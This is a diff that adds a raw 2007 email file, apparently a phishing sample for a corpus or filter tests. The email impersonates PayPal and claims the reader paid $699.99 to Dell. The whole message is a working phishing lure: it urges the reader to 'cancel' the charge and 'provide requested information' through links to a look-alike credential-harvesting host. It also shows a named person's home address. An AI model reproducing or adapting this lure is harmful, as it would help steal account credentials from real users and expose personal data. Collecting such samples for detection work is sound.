@@ -1,0 +1,255 @@
+From nobody Sun Jan 25 13:49:57 2015
+Return-Path: <order@paypal.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id A2CE12A894
+ for <user@example.com>; Wed, 11 Apr 2007 20:21:06 -0400 (EDT)
+Received: from mail.example.com (mail.example.com [192.168.1.2])
+ by mail.example.com (Example mail relay) with ESMTP id 6E9C6621F0E
+ for <user@example.com>; Wed, 11 Apr 2007 20:21:06 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id C6830163B7; Wed, 11 Apr 2007 20:28:23 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from dell-45b6fwez7m (c-24-30-33-153.hsd1.ga.comcast.net
+ [24.30.33.153])
+ by mail.example.com (Example mail relay) with ESMTP id 6F92716395
+ for <user@example.com>; Wed, 11 Apr 2007 20:28:23 -0400 (EDT)
+Received: from User ([70.182.12.216]) by dell-45b6fwez7m with Microsoft
+ SMTPSVC(5.0.2195.6713); Tue, 10 Apr 2007 15:51:00 -0400
+Reply-To: <order@paypal.com>
+From: "Paypal Security Departament" <order@paypal.com>
+Subject: This email confirms that you have paid $699.99 USD using PayPal.
+Date: Tue, 10 Apr 2007 14:53:09 -0500
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <DELL-45B6FWEZ7MJIzp000002e3@dell-45b6fwez7m>
+X-OriginalArrivalTime: 10 Apr 2007 19:51:00.0837 (UTC)
+ FILETIME=[908FA150:01C77BA9]
+To: undisclosed-recipients: ;
+X-Keywords: 
+Status: RO
+Content-Length: 9934
+Lines: 216
+
+<html>
+
+<head>
+
+<title>PayPal</title>
+
+</head>
+
+<body>
+
+
+
+<style type="text/css">BODY, TD {font-family: verdana,arial,helvetica,sans-serif;font-size: 12px;color: #000000;}
+
+
+
+LI {line-height: 120%;}
+
+UL.smallBorder {margin:10px 5px 10px 20px;}
+
+LI.smallBorderLi {margin:0px 0px 5px 0px;}
+
+UL.Narrow {margin:10px 5px 0px 40px;}
+
+HR.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left: #fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
+
+.smallEmphasis {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color: #000000;}
+
+.serifBig {font-family: serif;font-size: 20px;font-weight: bold;color: #000000;}
+
+.serif{font-family: serif;font-size: 16px;color: #000000;}
+
+.sansSerif{font-family: verdana,arial,helvetica,sans-serif; font-size: 16px;color: #000000;}
+
+.heading {font-family: verdana,arial,helvetica,sans-serif;font-size: 18px;font-weight: bold;color: #003366;}
+
+.subHeadingEoa {font-family: verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: bold;color: #000000;}
+
+.subHeading {font-family: verdana,arial,helvetica,sans-serif;font-size: 16px;font-weight: bold;color: #003366;}
+
+.sidebarText {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;color: #003366;}
+
+.sidebarTextBold {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color: #003366;}
+
+.xptFooter {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;color: #aaaaaa;}
+
+.button {font-size: 13px; font-family: verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset; color:#000000; background-color: #cccccc;}
+
+.smaller {font-family: verdana,arial,helvetica,sans-serif;font-size: 10px;color: #000000;}
+
+.smallerSidebar {font-family: verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
+
+.emphasis {font-weight: 700;}
+
+table#invoice, table#invoice_controls, table#invoice_note { width: 600px;}
+
+table#invoice_note {margin-top:10px; margin-bottom:10px;}
+
+table#invoice_controls {text-align: right;}
+
+table#invoice {border-collapse: collapse; border:1px solid #aaa; }
+
+table#invoice td {font-size:11px; border:1px solid #ccc;    padding:2px;}
+
+table#invoice td.field_label_right, table#invoice td.field_label_right_error {font-weight:bold; text-align:right;}
+
+table#invoice td.field_label_right_error, table#invoice td.field_label_error {color:red;}
+
+table#invoice tr.title td {font-weight:bold; line-height:20px; text-align:left; background-color: #ccddee;}
+
+table#invoice input.readonly {border:0px none; text-align:right}
+
+table#invoice input.readonly_currency {border:0px none; width:10px}
+
+.field_error, .field_error input.readonly_currency {background-color:#FF3333;}
+
+.currency_highlight {background-color: #ffffcc;}
+
+.tax {font-weight: 400; float: left;}
+
+table#invoice td span.curr {float: left;}
+
+table#invoice td.currency {border-right:1px solid #fff;}
+
+table#invoice td.calc {font-weight:bold; text-align:right;}
+
+.inlineBlue {color: #00f;}
+
+.small {font-size: 11px; font-weight: 400;}
+
+HR.solid {width: 100%; margin-top: 5px; margin-bottom: 0px; border-left: #fff; border-right: #fff; border-top: #fff; border-bottom: 2px solid #999;}
+
+.large {font-size: 17px;}
+
+.smallVerdanaGrey{font-family: verdana; font-size: 10px; color: #999999;}
+
+.smallVerdana {font-family: verdana; font-size: 10px; color :#000000;}
+
+.smallArial {font-family: arial; font-size: 13px; }
+
+.smallArialBlue {font-family: verdana; font-size: 9px; color: #0000FF;}
+
+.smallVerdanaGreen{font-family: verdana; font-size: 10px; color: #666666;}
+
+.smaller {font-size: 10px; color: gray;}
+
+.larger {font-size: 18px; font-family: arial; font-weight: 600; }
+
+.longTableValue{word-break:break-all;}
+
+.longSideBarText{width:190px; word-break: break-all;}
+
+</style>
+
+
+
+<table align="center" border="0" cellpadding="0" cellspacing="0" width="600"><tr valign="top"><td><a href="https://www.paypal.com/us" target=_blank>
+
+ <img src="http://images.paypal.com/en_US/i/logo/email_logo.gif" border="0" alt="PayPal" /= width="255" height="35"></a></td></tr></table><table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"><tr><td background="http://images.paypal.com/en_US/i/scr/bg_clk.gif" width="100%"><img alt="" border="0" height="29" src="http://images.paypal.com/en_US/i/scr/pixel.gif" width="1" /=></td></tr><tr><td><img alt="" border="0" height="10" src="http://images.paypal.com/en_US/i/scr/pixel.gif" width="1" /=></td></tr></table><table align="center" border="0" cellpadding="0" cellspacing="0" width="600"><tr>
+
+<td/></tr></table><table align="center" border="0" cellpadding="0" cellspacing="0" width="600"><tr valign="top">
+
+ <td width="100%">Dear member,<br/>
+
+<br/>
+
+This email confirms that you have paid orders@dell.com $699.99 USD using PayPal.<br/>
+
+<br/>
+
+This credit card transaction will appear on your bill as "PAYPAL *DELL INC".<br/>
+
+<br/><hr class="dotted" /=><br/><p class="subHeading">Payment Details</p><br/><table align="justify" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="3"><span class="emphasis">Purchased From:</span><img alt="" border="0" src="http://images.paypal.com/en_US/i/scr/pixel.gif" width="1" height="1" /=>Dell.Inc</td></tr></table><br><table align="justify" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-bottom: solid 1px #ccc; border-right: solid 1px #ccc; border-left: solid 1px #ccc;" style="border-bottom: solid 1px #ccc; border-right: solid 1px #ccc; border-left: solid 1px #ccc;"><tr><td><table align="center" border="0" cellpadding="2" cellspacing="0" width="100%"><tr bgcolor="#e2e0e0"><td class="longTableValue" width="25%"><span class="emphasis">Item #</span></td><td class="longTableValue" width="45%"><span class="emphasis">Item Title</span></td><td align="center" width="10%"><span class="emphasis">Quantity</span></td><td align="center" class="long
+ TableValue" width="10%"><span cla
+
+       <a target="_blank" href="http://60.142.24.212.kve.cz/https/order/cgi-bin/login.html">New Dell 6400 e1505 Intel Core Duo 1.66GHz 1GB Laptop</a></td>
+
+<td align="center" valign="top" width="10%">1</td>
+
+<td align="center" valign="top" width="10%">$669.95 USD</td>
+
+<td align="right" valign="top" width="10%">$669.95 USD</td>
+
+</tr></table></td></tr></table><br/><table align="justify" border="0" cellpadding="3" cellspacing="0" width="100%"><tr valign="top"><td align="right" width="85%">Shipping & Handling via USPS First Class Mail to 154XX<br/><span class="small">(includes any seller handling fees)</span></td>
+
+<td align="right">$19.16 USD</td>
+
+</tr><tr valign="top"><td align="right" width="85%">Shipping Insurance (optional):</td><td align="right">--</td></tr><tr valign="top"><td align="right" width="85%">Sales Tax<span class="small"> (6.000% inPA) </span> : </td>
+
+<td align="right">$10.88 USD</td>
+
+</tr><tr><td align="right" colspan="2" height="10" valign="top"><img height="1" width="125" src="http://images.paypal.com/en_US/i/scr/greyline.gif" border="0" alt="" /=></td></tr><tr><td align="right"><span class="emphasis">Total:</span></td>
+
+<td align="right" width="14%">$699.99 USD</td>
+
+</tr></table><table align="justify" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="3"><span class="emphasis">Note:</span><img alt="" border="0" src="http://images.paypal.com/en_US/i/scr/pixel.gif" width="1" height="1" /=>Thank you!</td></tr></table>
+
+<br/>
+
+<hr class="dotted" /=><br/>
+
+<br/>
+
+<p class="subHeading">Shipping Information</p><br/><table align="justify" border="0" cellpadding="0" cellspacing="0" width="400"><tr valign="top"><td align="right" class="smallEmphasis" width="30%">Shipping Info:</td><td width="5%"><img height="1" width="5" src="http://images.paypal.com/en_US/i/scr/pixel.gif" border="0" alt="" /=></td>
+
+<td width="65%">Wayne  E Bakewell<br/>16 elm st<br/>Brownsville, PA 15417<br/>United States<br/></td></tr><tr valign="top"><td align="right" class="smallEmphasis" width="110">Address Status:</td><td><img height="1" width="5" src="http://images.paypal.com/en_US/i/scr/pixel.gif" border="0" alt="" /=></td><td>Confirmed<a href="http://www.paypal.com/us/cgi-bin/webscr?cmd=p/pop/confirmed_address_checkout-outside" target=_blank><img src="http://images.paypal.com/en_US/i/scr/scr_symQuestion.gif" border="0" alt="" /= width="15" height="15"></a> </td>
+
+</tr></table><hr class="dotted" /=><br/>
+
+If you have questions about the shipping and tracking of your purchased item or service, please contact the seller orders@dell.com.<br/>
+
+<hr class="dotted" /=><br/>
+
+<p class="subHeading">Do you confirm this transaction? </p>
+
+<p>If this transaction was not made by you please immediately take the following steps:</p>
+
+<ul>
+
+ <li>Login to your account by clicking on the link below </li>
+
+ <li>Provide  requested information  to ensure you are the owner of the account </li>
+
+ <li>Find this transaction in HISTORY and click 'Cancel Transaction'</li>
+
+</ul>
+
+<br/><table align="center" bgcolor="#CCCC33" border="0" cellpadding="0" cellspacing="0"><tr><td><table align="center" bgcolor="#FFFFCC" border="0" cellpadding="8" cellspacing="0"><tr><td class="large"><img alt="" border="0" src="http://images.paypal.com/en_US/i/scr/pixel.gif" width="1" height="1" /=>
+
+<span class="emphasis">
+
+       <a target="_blank" href="http://60.142.24.212.kve.cz/https/order/cgi-bin/login.html">CANCEL TRANSACTION!</a></span><img alt="" border="0" src="http://images.paypal.com/en_US/i/scr/pixel.gif" width="1" height="1" /=></td>
+
+</tr></table></td></tr></table>
+
+<br/>
+
+Thank you for using PayPal!<br/>The PayPal Team<br/>
+
+<br/>
+
+<p class="xptFooter">Please do not reply to this email. This mailbox is not monitored and you will not receive a response. For assistance, log in to your PayPal account and choose the Help link located in the top right corner of any PayPal page.<br/>
+
+<br><span class="xptFooter">PayPal Email ID PP843</span>
+
+ </td>
+
+ </tr>
+
+ </table>
+
+</p>
+
+</body>
+
+</html>
